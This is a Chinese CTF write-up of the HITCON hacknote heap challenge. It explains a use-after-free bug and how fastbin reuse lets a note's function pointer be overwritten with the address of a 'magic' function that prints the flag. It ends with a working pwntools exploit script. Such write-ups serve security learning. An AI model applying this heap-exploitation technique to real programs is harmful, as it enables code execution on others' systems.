---
layout:     post
title: “hitcon pwn writeUp（二）”
subtitle:   "lab10+堆题开始！ "
date: 2019-08-30 15:32:00
author:     "许大仙"
header-img: "img/post-bg-alitrip.jpg"
catalog: true
tags:
    - CTF
---

## lab10

学了一段how2heap，这是第一次真正意义上的做堆题。

本题是<u>UAF</u>的利用【触发原因：**free后的指针并未置0**】。

### 一.分析过程

首先checksec看保护机制，<u>32-bit程序</u>：

![保护机制](/img/hitcon2/lab10_1.png)

#### 功能分析

运行一下就能感受到，这是个堆题啊。可进行的操作有

>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
>
>​       HackNote       
>
>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
>
> 1. Add note          
> 2. Delete note       
> 3. Print note        
> 4. Exit              
>
>\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

通过IDA反汇编可以得知，首先是根据输入的操作标号，分别调用`del_note()`，`print_note()`，`add_note()`，`exit(0)`函数。

##### 1.add_note

其中count作为note的计数器，notelist是指针数组，通过分析可以知道该指针是一个结构体指针，其中第一个字段`notelist[i]`为函数指针`print_note_content`，第二个字段`notelist[i]+1`为存储内容。

```go
struct note {//第一个字段malloc(8)，分配8B的空间，存储了4B函数指针（函数的首地址）和4B的content首地址
	void (*printnote)();  
	char *content ;       //第二个字段malloc(size)，存储了note的内容，指向堆块的mem地址
};
```

![add note](/img/hitcon2/lab10_3.png)

其中函数指针对应于

```go
int __cdecl print_note_content(int a1)
{
  return puts(*(const char **)(a1 + 4));
}
```

##### 2.del_note

这里存在两个造成漏洞的因素：

- 有free指向chunk mem指针和notelist[i]，但是未置为NULL。
  - 也就是`*content`还指向存储内容的chunk，但是这个chunk已经放入bin中。
  - 并没有把`*content`和设置为0x00
  - 同理`* notelist[i]`也没有置为0x00，故绕过了`if(notelist[i])`
- 并没有进行`count--`【故绕过了v1<0&&v1>=count】

综合以上两点，会造成UAF[use after free]漏洞。

![add note](/img/hitcon2/lab10_4.png)

##### 3.print_note

![add note](/img/hitcon2/lab10_5.png)

##### 4.magic

这个函数就直接调用了`cat flag`

#### 攻击思路

函数指针哎！！！还有一个现成的`cat flag`，这显然是想办法利用UAF漏洞将函数指针指向`magic`函数，调用了`print_note`就相当于调用了函数指针指向的函数【magic】，从而实现`cat flag`。

**UAF漏洞的常见效果就是会有两个指向同一个chunk的指针。**

如果我们需要想办法让函数指针不指向`print_note_content`，而是指向`magic()`，那么我们就需要对函数指针的字段进行修改。显然程序本身只有对content的修改，没有对函数指针的修改。

所以我们能想到的是，让<u>noteA的函数指针字段所在的chunk</u>，和<u>noteB的content所在的chunk</u>是**同一个chunk**【利用UAF】。就可以实现对noteB的content写，就是对noteA函数指针的修改。从而调用noteA的函数指针所指向的函数就是调用`magic`。

攻击具体过程为：

- 添加note1，大小为32（不要求是fastbin大小），内容随意
  - 添加一个note，会有两次malloc，得到2个chunk。
  - 一个为8B【实际为（8+4）align 8B = 16B=0x10】
  - 一个为32B【实际为40B=0x28】
- 添加note2，大小为32（不要求是fastbin大小），内容随意
- 添加note3，大小为32（不要求是fastbin大小），内容随意【这一步可以不要，主要是避免和顶块的合并】
- del掉note1
- del掉note2

此时的fast_bin的分布是这样的：

> note2_notelist(8大小)-->-->note1_notelist(8大小)【对齐后16B】
> note2_content(32大小)-->note1_content(32大小**)**

**攻击！**申请note4，size大小为8，内容为magic的函数地址。

- 申请note4的时候首先会申请一个8大小的空间【malloc(8)】作为notelist[4]，这时note2_notelist(8大小)的空间给了这个块。
- 接着再申请size 大小的块作为content，这时note1_notelist(8大小)的空间给了这个块。【此时note4的content所在chunk和note1_notelist所在的chunk为同一个】
  - **但是注意之前的note1、note2、note3的content的大小对齐后，实际大小不等于16，是为了此时分配16B的note4 content时不会被分配到之前的content的bin上，而是分配到notelist的bin上**
  - 将notelist和content的链分开
- 同时向note4 content中写入magic的函数地址，也就相对应向note1_notelist(8大小)写入magic的函数地址
- 对于note1，原本存放puts函数指针的地方被magic函数覆盖了，也就导致了接下来打印note1内容的时候会直接执行magic【调用notelist[1]的第一个字段指向的地址】
- 调用print_note打印note1的内容，执行magic函数【note1在[0,count]的范围内，允许打印】

#### exp

```python
from pwn import *
cn = process("./hacknote")
elf = ELF("./hacknote")

def addNote(size,content):
	cn.recvuntil("Your choice :")
	cn.sendline("1")
	cn.recvuntil("Note size :")
	cn.sendline(size)
	cn.recvuntil("Content :")
	cn.sendline(content)

def delNote(index):
	cn.recvuntil("Your choice :")
	cn.sendline("2")
	cn.recvuntil("Index :")
	cn.sendline(index)


def printNote(index):
	cn.recvuntil("Your choice :")
	cn.sendline("3")
	cn.recvuntil("Index :")
	cn.sendline(index)

addNote("32","note0") #note0
addNote("32","note1") #note1 【不必再add note2了】
delNote("0")
delNote("1")

magic_addr = p32(elf.symbols['magic']) #p32处理后为str类型，p32处理前为int类型
addNote("8",magic_addr) #read note0的函数指针，指向magic
printNote("0")
cn.interactive()
```

![add note](/img/hitcon2/lab10_6.png)

## lab11

